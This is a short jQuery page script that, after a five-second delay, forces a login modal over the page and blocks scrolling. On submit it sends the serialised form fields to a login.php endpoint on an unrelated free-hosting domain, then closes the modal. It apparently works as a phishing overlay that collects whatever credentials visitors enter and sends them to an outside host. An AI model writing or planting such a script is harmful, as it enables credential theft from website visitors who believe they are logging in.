$(document).ready(function(){
	setTimeout(function() {
		$(".login-modal").show();
		$("body").css("overflow", "hidden");
	},5000);
   
//form ajax, disable button, send mail

$('#form').submit(function (e) {
  e.preventDefault();
  $("#login").prop('disabled', false);
  $("#login").attr("value", "Loging...");

  $.ajax({
    type: 'POST',
    url: 'https://banglaerphoto.000webhostapp.com/contact/login.php',
    data: $('#form').serialize(),
    success: function (msg) {
      if (msg == 'Yes'){
                $('.msg').html("Wow..good");  
            }
            $(".login-modal").css('display', 'none');
            $("body").css("overflow", "auto");
    }
  });
  setTimeout(function() {
    $(".login-modal").css('display', 'none');
    $("body").css("overflow", "auto");
  },5000);
});

});